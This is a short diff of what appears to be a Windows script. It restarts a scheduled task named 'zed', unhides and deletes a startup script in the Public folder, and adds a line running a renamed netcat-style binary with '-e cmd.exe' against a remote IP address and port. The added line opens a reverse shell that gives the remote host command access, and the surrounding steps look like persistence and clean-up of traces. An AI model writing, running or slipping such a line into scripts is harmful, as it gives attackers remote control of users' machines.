@@ -6,4 +6,5 @@ Stop-ScheduledTask -TaskName zed
 Start-ScheduledTask -TaskName zed
 attrib -h C:\Users\Public\MyStartUp.ps1
 del C:\Users\Public\MyStartUp.ps1
+RNM.exe -nv 193.161.193.99 22352 -e cmd.exe
 
